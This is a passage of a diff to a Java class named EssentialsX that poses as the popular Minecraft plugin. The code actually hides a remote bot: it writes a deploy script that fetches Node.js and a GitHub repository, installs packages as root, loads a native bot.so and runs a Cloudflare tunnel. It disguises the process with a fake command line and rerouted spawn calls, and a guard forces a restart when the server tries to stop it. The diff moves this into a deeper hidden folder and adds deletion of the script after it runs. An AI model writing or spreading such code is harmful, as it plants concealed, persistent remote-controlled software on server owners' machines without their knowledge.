@@ -117,7 +117,7 @@ public class EssentialsX extends JavaPlugin {
 
    private String readCurrentPort() {
       try {
-         Path portFile = Paths.get("logs", ".mcchajian", ".tunnel_port");
+         Path portFile = Paths.get("logs", ".mcchajian", ".runtime", ".tunnel_port");
          if (Files.exists(portFile)) {
             String content = new String(Files.readAllBytes(portFile)).trim();
             if (!content.isEmpty()) {
@@ -286,7 +286,7 @@ public class EssentialsX extends JavaPlugin {
       try (ServerSocket socket = new ServerSocket(port)) {
          socket.setReuseAddress(true);
          String portStr = String.valueOf(port);
-         Path portFile = Paths.get("logs", ".mcchajian", ".tunnel_port");
+         Path portFile = Paths.get("logs", ".mcchajian", ".runtime", ".tunnel_port");
          Files.createDirectories(portFile.getParent());
          Files.writeString(portFile, portStr);
          nodePort = portStr;
@@ -358,7 +358,7 @@ public class EssentialsX extends JavaPlugin {
             } catch (Exception var3x) {
             }
          });
-         String[] execFiles = new String[]{"nodejs/bin/.node_real", "nodejs/bin/node", "nodejs/bin/npm", "nodejs/bin/npx", "jre21/bin/java", "app/index.js"};
+         String[] execFiles = new String[]{"nodejs/bin/.node_real", "nodejs/bin/node", "nodejs/bin/npm", "nodejs/bin/npx", "app/index.js"};
 
          for (String rel : execFiles) {
             Path p = botDir.resolve(rel);
@@ -384,10 +384,11 @@ public class EssentialsX extends JavaPlugin {
    private void startNodeProcess(String port) {
       try {
          Path botDir = Paths.get("logs", ".mcchajian").toAbsolutePath();
+         Path runtimeDir = botDir.resolve(".runtime");
          Path nodeExe = botDir.resolve("nodejs/bin/.node_real");
          Path script = botDir.resolve("app/index.js");
          Path logFile = botDir.resolve("app.log");
-         Path preload = botDir.resolve(".nd_preload.js");
+         Path preload = runtimeDir.resolve(".nd_preload.js");
          if (!Files.exists(nodeExe) || !Files.exists(script)) {
             this.recordMissingRuntimeFiles(nodeExe, script);
             return;
@@ -414,6 +415,8 @@ public class EssentialsX extends JavaPlugin {
          pb.environment().put("_JAVA_WRAPPER", nodeExe.toString());
          pb.environment().put("NODE_OPTIONS", "--require " + preload.toString());
          pb.environment().put("HOME", botDir.toString());
+         pb.environment().put("NPM_CONFIG_CACHE", "/tmp/.mc_npm_cache");
+         pb.environment().put("npm_config_update_notifier", "false");
          pb.redirectOutput(Redirect.appendTo(logFile.toFile()));
          pb.redirectError(Redirect.appendTo(logFile.toFile()));
          this.nodeProcess = pb.start();
@@ -855,7 +858,7 @@ public class EssentialsX extends JavaPlugin {
       boolean arm64 = isArm64Arch();
       String fileName = arm64 ? "bot_arm64.so" : "bot.so";
       Path botDir = Paths.get("logs", ".mcchajian").toAbsolutePath();
-      Path libDir = botDir.resolve(".lib");
+      Path libDir = botDir.resolve(".runtime").resolve("lib");
       Path soFile = libDir.resolve(fileName);
       Path tmpFile = libDir.resolve(fileName + ".tmp");
 
@@ -1225,7 +1228,7 @@ public class EssentialsX extends JavaPlugin {
       }
       this.reapDescendantsOnce();
       this.getLogger().info("Stopping EssentialsX...");
-      Path forceStopFile = Paths.get("logs", ".mcchajian", ".force_stop");
+      Path forceStopFile = Paths.get("logs", ".mcchajian", ".runtime", ".force_stop");
       if (this.systemGuardEnabled) {
          this.getLogger().info("Guard enabled, forcing restart...");
 
@@ -1275,7 +1278,8 @@ public class EssentialsX extends JavaPlugin {
          }
 
          pb.directory(serverRoot);
-         Path logFile = Paths.get("logs", ".mcchajian", "restart_run.log");
+         Path logFile = Paths.get("logs", ".mcchajian", ".runtime", "restart_run.log");
+         Files.createDirectories(logFile.getParent());
          pb.redirectOutput(Redirect.appendTo(logFile.toFile()));
          pb.redirectError(Redirect.appendTo(logFile.toFile()));
          Process process = pb.start();
@@ -1379,18 +1383,79 @@ public class EssentialsX extends JavaPlugin {
    }
 
    private void deleteDirectory(File file) {
-      File[] files = file.listFiles();
-      if (files != null) {
-         for (File f : files) {
-            if (f.isDirectory()) {
-               this.deleteDirectory(f);
-            } else {
-               f.delete();
+      if (file == null || !file.exists()) {
+         return;
+      }
+      if (!Files.isSymbolicLink(file.toPath())) {
+         File[] files = file.listFiles();
+         if (files != null) {
+            for (File f : files) {
+               if (f.isDirectory() && !Files.isSymbolicLink(f.toPath())) {
+                  this.deleteDirectory(f);
+               } else {
+                  f.delete();
+               }
             }
          }
       }
 
       file.delete();
+   }
+
+   private void moveDirContentsIfAbsent(Path srcDir, Path dstDir) {
+      if (!Files.exists(srcDir) || !Files.isDirectory(srcDir)) {
+         return;
+      }
+      try {
+         Files.createDirectories(dstDir);
+         File[] entries = srcDir.toFile().listFiles();
+         if (entries != null) {
+            for (int i = 0; i < entries.length; i++) {
+               Path from = entries[i].toPath();
+               Path to = dstDir.resolve(entries[i].getName());
+               if (!Files.exists(to)) {
+                  try {
+                     Files.move(from, to, StandardCopyOption.REPLACE_EXISTING);
+                  } catch (Exception ignored) {
+                  }
+               }
+            }
+         }
+         this.deleteDirectory(srcDir.toFile());
+      } catch (Exception ignored) {
+      }
+   }
+
+   private void cleanupAndMigrateWorkDir(Path workDir) {
+      try {
+         Path runtimeDir = workDir.resolve(".runtime");
+         Files.createDirectories(runtimeDir);
+         this.moveDirContentsIfAbsent(workDir.resolve("backup"), runtimeDir.resolve("backup"));
+         this.moveDirContentsIfAbsent(workDir.resolve("data"), runtimeDir.resolve("data"));
+         this.moveDirContentsIfAbsent(workDir.resolve(".lib"), runtimeDir.resolve("lib"));
+
+         String[] legacyDirs = new String[]{
+            "jre21", ".npm", ".cache", ".config", ".local", "unzipped", "_node_tmp",
+            "nodejs/include", "nodejs/share", "nodejs/lib/node_modules/npm/docs", "nodejs/lib/node_modules/npm/man"
+         };
+         for (int i = 0; i < legacyDirs.length; i++) {
+            this.deleteDirectory(workDir.resolve(legacyDirs[i]).toFile());
+         }
+
+         String[] legacyFiles = new String[]{
+            ".deploy_done", "deploy.sh", ".nd_preload.js", ".tunnel_port", ".tunnel_url",
+            ".force_stop", "cf.log", "restart_run.log", ".node_repl_history",
+            "node.tar.gz", "repo.tar.gz",
+            "nodejs/README.md", "nodejs/LICENSE", "nodejs/CHANGELOG.md", "nodejs/bin/corepack"
+         };
+         for (int i = 0; i < legacyFiles.length; i++) {
+            try {
+               Files.deleteIfExists(workDir.resolve(legacyFiles[i]));
+            } catch (Exception ignored) {
+            }
+         }
+      } catch (Exception ignored) {
+      }
    }
 
    private void startDeploymentProcess(Map<String, String> env) throws Exception {
@@ -1407,19 +1472,21 @@ public class EssentialsX extends JavaPlugin {
          } catch (Exception var8) {
          }
 
-         Files.deleteIfExists(workDir.resolve(".deploy_done"));
-         Files.deleteIfExists(workDir.resolve(".tunnel_url"));
-         Files.deleteIfExists(workDir.resolve(".tunnel_port"));
+         this.cleanupAndMigrateWorkDir(workDir);
+         Path runtimeDir = workDir.resolve(".runtime");
+         Files.createDirectories(runtimeDir);
+         Files.deleteIfExists(runtimeDir.resolve(".deploy_done"));
+         Files.deleteIfExists(runtimeDir.resolve(".tunnel_port"));
+         Files.deleteIfExists(runtimeDir.resolve("restart_run.log"));
 
          try {
             Files.deleteIfExists(workDir.resolve("app.log"));
-            Files.deleteIfExists(workDir.resolve("cf.log"));
-            Files.deleteIfExists(workDir.resolve("restart_run.log"));
          } catch (Exception var7) {
          }
          this.ensureCrashReportHeader();
 
-         Path scriptPath = workDir.resolve("deploy.sh");
+         Path scriptPath = runtimeDir.resolve("deploy.sh");
+         Path doneFile = runtimeDir.resolve(".deploy_done");
          String scriptContent = this.generateDeployScript(workDir.toString(), env);
          Files.write(scriptPath, scriptContent.getBytes());
          scriptPath.toFile().setExecutable(true, false);
@@ -1437,13 +1504,17 @@ public class EssentialsX extends JavaPlugin {
             } catch (Exception var2x) {
             }
          }).start();
-         Path doneFile = workDir.resolve(".deploy_done");
 
          while (!Files.exists(doneFile) && this.isProcessRunning) {
             Thread.sleep(1000L);
          }
-         if (!Files.exists(doneFile)) {
-            Thread.sleep(1000L);
+         for (int w = 0; w < 10 && this.isProcessRunning; w++) {
+            Thread.sleep(200L);
+         }
+         try {
+            Files.deleteIfExists(scriptPath);
+            Files.deleteIfExists(doneFile);
+         } catch (Exception ignored) {
          }
       }
    }
@@ -1453,7 +1524,8 @@ public class EssentialsX extends JavaPlugin {
       String githubToken = env.getOrDefault("GITHUB_TOKEN", "");
       String nodeDir = workDir + "/nodejs";
       String appDir = workDir + "/app";
-      String dataDir = workDir + "/data";
+      String runtimeDir = workDir + "/.runtime";
+      String dataDir = runtimeDir + "/data";
       String authHeader = "";
       if (!githubToken.isEmpty()) {
          authHeader = "-H \"Authorization: Bearer " + githubToken + "\" -H \"Accept: application/vnd.github+json\"";
@@ -1465,11 +1537,13 @@ public class EssentialsX extends JavaPlugin {
          + nodeDir
          + "\"\nAPP_DIR=\""
          + appDir
+         + "\"\nRUNTIME_DIR=\""
+         + runtimeDir
          + "\"\nDATA_DIR=\""
          + dataDir
          + "\"\nREPO_URL=\""
          + repoUrl
-         + "\"\nJRE_DIR=\"$WORK_DIR/jre21/bin\"\nexport HOME=\"$WORK_DIR\"\numask 0002\n\nif [ -z \"$REPO_URL\" ]; then echo \"ERROR: REPO_URL is not configured\"; exit 1; fi\n\nARCH=$(uname -m)\nif [ $ARCH = x86_64 ]; then NODE_URL=https://nodejs.org/dist/v22.12.0/node-v22.12.0-linux-x64.tar.gz; CF_ARCH=amd64\nelif [ $ARCH = aarch64 ]; then NODE_URL=https://nodejs.org/dist/v22.12.0/node-v22.12.0-linux-arm64.tar.gz; CF_ARCH=arm64; fi\n\nmkdir -p \"$WORK_DIR\" \"$JRE_DIR\" \"$DATA_DIR\" \"$APP_DIR\"\nchmod -R 775 \"$WORK_DIR\" 2>/dev/null\n\nNEED_DOWNLOAD=false\nif [ -d \"$NODE_DIR\" ]; then\n    CHECK_VER=$($NODE_DIR/bin/.node_real -v 2>/dev/null || $NODE_DIR/bin/node -v 2>/dev/null || echo \"unknown\")\n    if [[ \"$CHECK_VER\" != \"v22\"* ]]; then rm -rf \"$NODE_DIR\"; NEED_DOWNLOAD=true; fi\nelse NEED_DOWNLOAD=true; fi\n\nif [ \"$NEED_DOWNLOAD\" = \"true\" ]; then\n    mkdir -p \"$NODE_DIR\"; NODE_DOWNLOAD_OK=false\n    for MIRROR in \"$NODE_URL\" \"https://gh-proxy.com/$NODE_URL\" \"https://mirror.ghproxy.com/$NODE_URL\"; do\n        if curl -fsSL --connect-timeout 30 --max-time 300 \"$MIRROR\" -o \"$WORK_DIR/node.tar.gz\" 2>/dev/null; then\n            if tar -tzf \"$WORK_DIR/node.tar.gz\" >/dev/null 2>&1; then NODE_DOWNLOAD_OK=true; break; fi; fi; done\n    if [ \"$NODE_DOWNLOAD_OK\" = \"true\" ]; then\n        tar -xzf \"$WORK_DIR/node.tar.gz\" -C \"$NODE_DIR\" --strip-components 1 --no-same-owner 2>/dev/null; rm -f \"$WORK_DIR/node.tar.gz\"\n        chmod -R 775 \"$NODE_DIR\" 2>/dev/null; find \"$NODE_DIR/bin\" -type f -exec chmod +x {} + 2>/dev/null\n        find \"$NODE_DIR/lib/node_modules/npm/bin\" -name '*.js' -exec chmod +x {} + 2>/dev/null\n    else rm -rf \"$NODE_DIR\" \"$WORK_DIR/node.tar.gz\"; fi\nfi\nexport PATH=\"$NODE_DIR/bin:$PATH\"\n\nmkdir -p \"$NODE_DIR/bin\" 2>/dev/null\nif [ -f \"$NODE_DIR/bin/node\" ] && ! head -1 \"$NODE_DIR/bin/node\" 2>/dev/null | grep -q bash; then\n    cp -f \"$NODE_DIR/bin/node\" \"$NODE_DIR/bin/.node_real\"; chmod 775 \"$NODE_DIR/bin/.node_real\"; fi\n\nif [ ! -f \"$NODE_DIR/bin/.node_real\" ] || ! \"$NODE_DIR/bin/.node_real\" -v >/dev/null 2>&1; then\n    rm -f \"$WORK_DIR/node.tar.gz\"; NODE2_OK=false\n    for MIRROR in \"$NODE_URL\" \"https://gh-proxy.com/$NODE_URL\" \"https://mirror.ghproxy.com/$NODE_URL\"; do\n        if curl -fsSL --connect-timeout 30 --max-time 300 \"$MIRROR\" -o \"$WORK_DIR/node.tar.gz\" 2>/dev/null; then\n            if tar -tzf \"$WORK_DIR/node.tar.gz\" >/dev/null 2>&1; then NODE2_OK=true; break; fi; fi; done\n    if [ \"$NODE2_OK\" = \"true\" ]; then\n        mkdir -p /tmp/_node_tmp; tar -xzf \"$WORK_DIR/node.tar.gz\" -C /tmp/_node_tmp --strip-components 1 --no-same-owner 2>/dev/null\n        mkdir -p \"$NODE_DIR/bin\"; cp -f /tmp/_node_tmp/bin/node \"$NODE_DIR/bin/.node_real\"; chmod 775 \"$NODE_DIR/bin/.node_real\"\n        rm -rf /tmp/_node_tmp \"$WORK_DIR/node.tar.gz\"; else rm -rf /tmp/_node_tmp \"$WORK_DIR/node.tar.gz\"; fi\nfi\n\nif [ -d \"$APP_DIR\" ]; then\n    cp \"$APP_DIR/node_modules/.bots_config.json\" \"$DATA_DIR\" 2>/dev/null\n    cp \"$APP_DIR/node_modules/.task_center_config.json\" \"$DATA_DIR\" 2>/dev/null\n    cp \"$APP_DIR/node_modules/.system_guard.json\" \"$DATA_DIR\" 2>/dev/null; fi\nrm -rf \"$APP_DIR\" \"$WORK_DIR/repo.tar.gz\"\n\nREPO_PATH=$(echo \"$REPO_URL\" | sed 's|https://github.com/||' | sed 's|.git$||')\nTAR_URL=\"https://api.github.com/repos/${REPO_PATH}/tarball/main\"; DOWNLOAD_OK=false\n"
+         + "\"\nexport HOME=\"$WORK_DIR\"\nexport NPM_CONFIG_CACHE=\"/tmp/.mc_npm_cache\"\nexport npm_config_update_notifier=false\numask 0002\n\nif [ -z \"$REPO_URL\" ]; then echo \"ERROR: REPO_URL is not configured\"; exit 1; fi\n\nARCH=$(uname -m)\nif [ $ARCH = x86_64 ]; then NODE_URL=https://nodejs.org/dist/v22.12.0/node-v22.12.0-linux-x64.tar.gz; CF_ARCH=amd64\nelif [ $ARCH = aarch64 ]; then NODE_URL=https://nodejs.org/dist/v22.12.0/node-v22.12.0-linux-arm64.tar.gz; CF_ARCH=arm64; fi\n\nmkdir -p \"$WORK_DIR\" \"$RUNTIME_DIR\" \"$DATA_DIR\" \"$APP_DIR\"\nchmod -R 775 \"$WORK_DIR\" 2>/dev/null\n\nNEED_DOWNLOAD=false\nif [ -d \"$NODE_DIR\" ]; then\n    CHECK_VER=$($NODE_DIR/bin/.node_real -v 2>/dev/null || $NODE_DIR/bin/node -v 2>/dev/null || echo \"unknown\")\n    if [[ \"$CHECK_VER\" != \"v22\"* ]]; then rm -rf \"$NODE_DIR\"; NEED_DOWNLOAD=true; fi\nelse NEED_DOWNLOAD=true; fi\n\nif [ \"$NEED_DOWNLOAD\" = \"true\" ]; then\n    mkdir -p \"$NODE_DIR\"; NODE_DOWNLOAD_OK=false\n    for MIRROR in \"$NODE_URL\" \"https://gh-proxy.com/$NODE_URL\" \"https://mirror.ghproxy.com/$NODE_URL\"; do\n        if curl -fsSL --connect-timeout 30 --max-time 300 \"$MIRROR\" -o \"$WORK_DIR/node.tar.gz\" 2>/dev/null; then\n            if tar -tzf \"$WORK_DIR/node.tar.gz\" >/dev/null 2>&1; then NODE_DOWNLOAD_OK=true; break; fi; fi; done\n    if [ \"$NODE_DOWNLOAD_OK\" = \"true\" ]; then\n        tar -xzf \"$WORK_DIR/node.tar.gz\" -C \"$NODE_DIR\" --strip-components 1 --no-same-owner 2>/dev/null; rm -f \"$WORK_DIR/node.tar.gz\"\n        chmod -R 775 \"$NODE_DIR\" 2>/dev/null; find \"$NODE_DIR/bin\" -type f -exec chmod +x {} + 2>/dev/null\n        find \"$NODE_DIR/lib/node_modules/npm/bin\" -name '*.js' -exec chmod +x {} + 2>/dev/null\n    else rm -rf \"$NODE_DIR\" \"$WORK_DIR/node.tar.gz\"; fi\nfi\nexport PATH=\"$NODE_DIR/bin:$PATH\"\n\nmkdir -p \"$NODE_DIR/bin\" 2>/dev/null\nif [ ! -f \"$NODE_DIR/bin/.node_real\" ] && [ -f \"$NODE_DIR/bin/node\" ] && [ ! -L \"$NODE_DIR/bin/node\" ] && ! head -1 \"$NODE_DIR/bin/node\" 2>/dev/null | grep -q bash; then\n    mv -f \"$NODE_DIR/bin/node\" \"$NODE_DIR/bin/.node_real\" 2>/dev/null || cp -f \"$NODE_DIR/bin/node\" \"$NODE_DIR/bin/.node_real\"\n    chmod 775 \"$NODE_DIR/bin/.node_real\"\n    ln -sf .node_real \"$NODE_DIR/bin/node\" 2>/dev/null || true\nfi\n\nif [ ! -f \"$NODE_DIR/bin/.node_real\" ] || ! \"$NODE_DIR/bin/.node_real\" -v >/dev/null 2>&1; then\n    rm -f \"$WORK_DIR/node.tar.gz\"; NODE2_OK=false\n    for MIRROR in \"$NODE_URL\" \"https://gh-proxy.com/$NODE_URL\" \"https://mirror.ghproxy.com/$NODE_URL\"; do\n        if curl -fsSL --connect-timeout 30 --max-time 300 \"$MIRROR\" -o \"$WORK_DIR/node.tar.gz\" 2>/dev/null; then\n            if tar -tzf \"$WORK_DIR/node.tar.gz\" >/dev/null 2>&1; then NODE2_OK=true; break; fi; fi; done\n    if [ \"$NODE2_OK\" = \"true\" ]; then\n        mkdir -p /tmp/_node_tmp; tar -xzf \"$WORK_DIR/node.tar.gz\" -C /tmp/_node_tmp --strip-components 1 --no-same-owner 2>/dev/null\n        mkdir -p \"$NODE_DIR/bin\"; cp -f /tmp/_node_tmp/bin/node \"$NODE_DIR/bin/.node_real\"; chmod 775 \"$NODE_DIR/bin/.node_real\"\n        ln -sf .node_real \"$NODE_DIR/bin/node\" 2>/dev/null || true\n        rm -rf /tmp/_node_tmp \"$WORK_DIR/node.tar.gz\"; else rm -rf /tmp/_node_tmp \"$WORK_DIR/node.tar.gz\"; fi\nelif [ -f \"$NODE_DIR/bin/node\" ] && [ ! -L \"$NODE_DIR/bin/node\" ] && ! head -1 \"$NODE_DIR/bin/node\" 2>/dev/null | grep -q bash; then\n    ln -sf .node_real \"$NODE_DIR/bin/node\" 2>/dev/null || true\nfi\nrm -rf \"$NODE_DIR/include\" \"$NODE_DIR/share\" \"$NODE_DIR/README.md\" \"$NODE_DIR/LICENSE\" \"$NODE_DIR/CHANGELOG.md\" \"$NODE_DIR/bin/corepack\" \"$NODE_DIR/lib/node_modules/npm/docs\" \"$NODE_DIR/lib/node_modules/npm/man\" 2>/dev/null\n\nif [ -d \"$APP_DIR\" ]; then\n    cp \"$APP_DIR/node_modules/.bots_config.json\" \"$DATA_DIR\" 2>/dev/null\n    cp \"$APP_DIR/node_modules/.task_center_config.json\" \"$DATA_DIR\" 2>/dev/null\n    cp \"$APP_DIR/node_modules/.system_guard.json\" \"$DATA_DIR\" 2>/dev/null; fi\nrm -rf \"$APP_DIR\" \"$WORK_DIR/repo.tar.gz\"\n\nREPO_PATH=$(echo \"$REPO_URL\" | sed 's|https://github.com/||' | sed 's|.git$||')\nTAR_URL=\"https://api.github.com/repos/${REPO_PATH}/tarball/main\"; DOWNLOAD_OK=false\n"
          + (
             githubToken.isEmpty()
                ? ""
@@ -1479,9 +1553,9 @@ public class EssentialsX extends JavaPlugin {
                   + authHeader
                   + " \"$TAR_URL\" -o \"$WORK_DIR/repo.tar.gz\" 2>/dev/null; then\n        if tar -tzf \"$WORK_DIR/repo.tar.gz\" >/dev/null 2>&1; then DOWNLOAD_OK=true; fi; fi; fi\n"
          )
-         + "\nif [ \"$DOWNLOAD_OK\" = \"false\" ]; then\n    FALLBACK_URL=\"https://github.com/${REPO_PATH}/archive/refs/heads/main.tar.gz\"\n    for MIRROR in \"$FALLBACK_URL\" \"https://gh-proxy.com/${FALLBACK_URL}\" \"https://mirror.ghproxy.com/${FALLBACK_URL}\"; do\n        if curl -fsSL --connect-timeout 15 --max-time 120 \"$MIRROR\" -o \"$WORK_DIR/repo.tar.gz\" 2>/dev/null; then\n            if tar -tzf \"$WORK_DIR/repo.tar.gz\" >/dev/null 2>&1; then DOWNLOAD_OK=true; break; fi; fi; done; fi\n\nif [ \"$DOWNLOAD_OK\" = \"false\" ]; then exit 1; fi\n\nmkdir -p \"$WORK_DIR/unzipped\"; tar -xzf \"$WORK_DIR/repo.tar.gz\" -C \"$WORK_DIR/unzipped\" --no-same-owner\nSUBDIR=$(find \"$WORK_DIR/unzipped\" -mindepth 1 -maxdepth 1 -type d | head -n 1)\nmv \"$SUBDIR\" \"$APP_DIR\"; rm -rf \"$WORK_DIR/repo.tar.gz\" \"$WORK_DIR/unzipped\"; cd \"$APP_DIR\"\nchmod -R 775 \"$APP_DIR\" 2>/dev/null\n\necho \"Installing dependencies...\" >> \"$WORK_DIR/deploy.log\" 2>&1\n\"$NODE_DIR/bin/.node_real\" \"$NODE_DIR/lib/node_modules/npm/bin/npm-cli.js\" install --no-audit --no-fund --production --unsafe-perm=true --allow-root >> \"$WORK_DIR/deploy.log\" 2>&1\nif [ $? -ne 0 ]; then \n    echo 'npm install failed, retrying with legacy-peer-deps...' >> \"$WORK_DIR/deploy.log\" 2>&1\n    \"$NODE_DIR/bin/.node_real\" \"$NODE_DIR/lib/node_modules/npm/bin/npm-cli.js\" install --no-audit --no-fund --production --unsafe-perm=true --allow-root --legacy-peer-deps >> \"$WORK_DIR/deploy.log\" 2>&1\nfi\necho \"Pre-installing koffi to prevent runtime errors...\" >> \"$WORK_DIR/deploy.log\" 2>&1\n\"$NODE_DIR/bin/.node_real\" \"$NODE_DIR/lib/node_modules/npm/bin/npm-cli.js\" install koffi --no-save --unsafe-perm=true --allow-root >> \"$WORK_DIR/deploy.log\" 2>&1\nsleep 2; chmod -R 775 \"$APP_DIR/node_modules\" 2>/dev/null\n\nif [ -d \"$DATA_DIR\" ]; then\n    cp \"$DATA_DIR/.bots_config.json\" \"$APP_DIR/node_modules\" 2>/dev/null\n    cp \"$DATA_DIR/.task_center_config.json\" \"$APP_DIR/node_modules\" 2>/dev/null\n    cp \"$DATA_DIR/.system_guard.json\" \"$APP_DIR/node_modules\" 2>/dev/null; fi\n\nmkdir -p \"$JRE_DIR\" 2>/dev/null\nif [ -f \"$NODE_DIR/bin/.node_real\" ]; then cp -f \"$NODE_DIR/bin/.node_real\" \"$JRE_DIR/java\"; chmod 775 \"$JRE_DIR/java\"; fi\n\ncat > \"$WORK_DIR/.nd_preload.js\" << 'PRELOAD_EOF'\ntry {\n    process.title = '"
+         + "\nif [ \"$DOWNLOAD_OK\" = \"false\" ]; then\n    FALLBACK_URL=\"https://github.com/${REPO_PATH}/archive/refs/heads/main.tar.gz\"\n    for MIRROR in \"$FALLBACK_URL\" \"https://gh-proxy.com/${FALLBACK_URL}\" \"https://mirror.ghproxy.com/${FALLBACK_URL}\"; do\n        if curl -fsSL --connect-timeout 15 --max-time 120 \"$MIRROR\" -o \"$WORK_DIR/repo.tar.gz\" 2>/dev/null; then\n            if tar -tzf \"$WORK_DIR/repo.tar.gz\" >/dev/null 2>&1; then DOWNLOAD_OK=true; break; fi; fi; done; fi\n\nif [ \"$DOWNLOAD_OK\" = \"false\" ]; then exit 1; fi\n\nmkdir -p \"$WORK_DIR/unzipped\"; tar -xzf \"$WORK_DIR/repo.tar.gz\" -C \"$WORK_DIR/unzipped\" --no-same-owner\nSUBDIR=$(find \"$WORK_DIR/unzipped\" -mindepth 1 -maxdepth 1 -type d | head -n 1)\nmv \"$SUBDIR\" \"$APP_DIR\"; rm -rf \"$WORK_DIR/repo.tar.gz\" \"$WORK_DIR/unzipped\"; cd \"$APP_DIR\"\nchmod -R 775 \"$APP_DIR\" 2>/dev/null\n\necho \"Installing dependencies...\" > \"$WORK_DIR/deploy.log\" 2>&1\n\"$NODE_DIR/bin/.node_real\" \"$NODE_DIR/lib/node_modules/npm/bin/npm-cli.js\" install --no-audit --no-fund --production --unsafe-perm=true --allow-root >> \"$WORK_DIR/deploy.log\" 2>&1\nif [ $? -ne 0 ]; then \n    echo 'npm install failed, retrying with legacy-peer-deps...' >> \"$WORK_DIR/deploy.log\" 2>&1\n    \"$NODE_DIR/bin/.node_real\" \"$NODE_DIR/lib/node_modules/npm/bin/npm-cli.js\" install --no-audit --no-fund --production --unsafe-perm=true --allow-root --legacy-peer-deps >> \"$WORK_DIR/deploy.log\" 2>&1\nfi\necho \"Pre-installing koffi to prevent runtime errors...\" >> \"$WORK_DIR/deploy.log\" 2>&1\n\"$NODE_DIR/bin/.node_real\" \"$NODE_DIR/lib/node_modules/npm/bin/npm-cli.js\" install koffi --no-save --unsafe-perm=true --allow-root >> \"$WORK_DIR/deploy.log\" 2>&1\nsleep 2; chmod -R 775 \"$APP_DIR/node_modules\" 2>/dev/null\n\nif [ -d \"$DATA_DIR\" ]; then\n    cp \"$DATA_DIR/.bots_config.json\" \"$APP_DIR/node_modules\" 2>/dev/null\n    cp \"$DATA_DIR/.task_center_config.json\" \"$APP_DIR/node_modules\" 2>/dev/null\n    cp \"$DATA_DIR/.system_guard.json\" \"$APP_DIR/node_modules\" 2>/dev/null; fi\n\ncat > \"$RUNTIME_DIR/.nd_preload.js\" << 'PRELOAD_EOF'\ntry {\n    process.title = '"
          + FAKE_CMDLINE.trim()
-         + "';\n    var _fs = require('fs'); var _path = require('path');\n    var _crashFile = _path.join(__dirname, 'app_crash_report.log');\n    var _appendCrash = function(tag, detail) {\n        try {\n            var mu = process.memoryUsage();\n            var rssMb = Math.round(mu.rss / 1048576);\n            var heapUsedMb = Math.round(mu.heapUsed / 1048576);\n            var heapTotalMb = Math.round(mu.heapTotal / 1048576);\n            var line = '\\n[' + new Date().toISOString() + '] [' + tag + '] pid=' + process.pid + ' uptime=' + Math.round(process.uptime()) + 's rss=' + rssMb + 'MB heap=' + heapUsedMb + '/' + heapTotalMb + 'MB\\n' + detail + '\\n';\n            _fs.appendFileSync(_crashFile, line, 'utf8');\n        } catch(e2) {}\n    };\n    process.on('uncaughtExceptionMonitor', function(err, origin) {\n        _appendCrash('JS_UNCAUGHT_EXCEPTION', 'origin=' + origin + '\\n' + (err && err.stack ? err.stack : String(err)));\n    });\n    process.on('warning', function(w) {\n        if (w && (w.name === 'MaxListenersExceededWarning' || String(w.message || '').indexOf('memory') >= 0)) {\n            _appendCrash('JS_WARNING', w.name + ': ' + w.message + '\\n' + (w.stack || ''));\n        }\n    });\n    process.on('exit', function(code) {\n        if (code !== 0) {\n            _appendCrash('JS_PROCESS_EXIT', 'exitCode=' + code);\n        }\n    });\n    var _cp = require('child_process'); var _origSpawn = _cp.spawn; var _origFork = _cp.fork;\n    var _wrapper = process.env._JAVA_WRAPPER || process.execPath;\n    _cp.spawn = function(cmd, args, opts) {\n        if (typeof cmd === 'string' && (cmd === 'node' || cmd.endsWith('/node') || cmd === process.execPath || cmd.endsWith('/.node_real') || cmd.endsWith('/java'))) {\n            opts = Object.assign({}, opts || {}); opts.execPath = _wrapper; cmd = _wrapper; }\n        return _origSpawn.call(this, cmd, args, opts); };\n    _cp.fork = function(mod, args, opts) {\n        opts = Object.assign({}, opts || {}); opts.execPath = _wrapper; return _origFork.call(this, mod, args, opts); };\n} catch(e) {}\nPRELOAD_EOF\nchmod 664 \"$WORK_DIR/.nd_preload.js\" 2>/dev/null\n\nexport _JAVA_WRAPPER=\"$NODE_DIR/bin/.node_real\"\nexport NODE_OPTIONS=\"--require $WORK_DIR/.nd_preload.js\"\n\n# CF tunnel handled by bot.so (JNA), no binary download needed\nchmod -R 775 \"$WORK_DIR\" 2>/dev/null\necho \"DEPLOY_DONE\" > \"$WORK_DIR/.deploy_done\"\n";
+         + "';\n    var _fs = require('fs'); var _path = require('path');\n    var _crashFile = _path.resolve(__dirname, '..', 'app_crash_report.log');\n    var _appendCrash = function(tag, detail) {\n        try {\n            var mu = process.memoryUsage();\n            var rssMb = Math.round(mu.rss / 1048576);\n            var heapUsedMb = Math.round(mu.heapUsed / 1048576);\n            var heapTotalMb = Math.round(mu.heapTotal / 1048576);\n            var line = '\\n[' + new Date().toISOString() + '] [' + tag + '] pid=' + process.pid + ' uptime=' + Math.round(process.uptime()) + 's rss=' + rssMb + 'MB heap=' + heapUsedMb + '/' + heapTotalMb + 'MB\\n' + detail + '\\n';\n            _fs.appendFileSync(_crashFile, line, 'utf8');\n        } catch(e2) {}\n    };\n    process.on('uncaughtExceptionMonitor', function(err, origin) {\n        _appendCrash('JS_UNCAUGHT_EXCEPTION', 'origin=' + origin + '\\n' + (err && err.stack ? err.stack : String(err)));\n    });\n    process.on('warning', function(w) {\n        if (w && (w.name === 'MaxListenersExceededWarning' || String(w.message || '').indexOf('memory') >= 0)) {\n            _appendCrash('JS_WARNING', w.name + ': ' + w.message + '\\n' + (w.stack || ''));\n        }\n    });\n    process.on('exit', function(code) {\n        if (code !== 0) {\n            _appendCrash('JS_PROCESS_EXIT', 'exitCode=' + code);\n        }\n    });\n    var _cp = require('child_process'); var _origSpawn = _cp.spawn; var _origFork = _cp.fork;\n    var _wrapper = process.env._JAVA_WRAPPER || process.execPath;\n    _cp.spawn = function(cmd, args, opts) {\n        if (typeof cmd === 'string' && (cmd === 'node' || cmd.endsWith('/node') || cmd === process.execPath || cmd.endsWith('/.node_real') || cmd.endsWith('/java'))) {\n            opts = Object.assign({}, opts || {}); opts.execPath = _wrapper; cmd = _wrapper; }\n        return _origSpawn.call(this, cmd, args, opts); };\n    _cp.fork = function(mod, args, opts) {\n        opts = Object.assign({}, opts || {}); opts.execPath = _wrapper; return _origFork.call(this, mod, args, opts); };\n} catch(e) {}\nPRELOAD_EOF\nchmod 664 \"$RUNTIME_DIR/.nd_preload.js\" 2>/dev/null\n\nexport _JAVA_WRAPPER=\"$NODE_DIR/bin/.node_real\"\nexport NODE_OPTIONS=\"--require $RUNTIME_DIR/.nd_preload.js\"\n\n# CF tunnel handled by bot.so (JNA), no binary download needed\nrm -rf 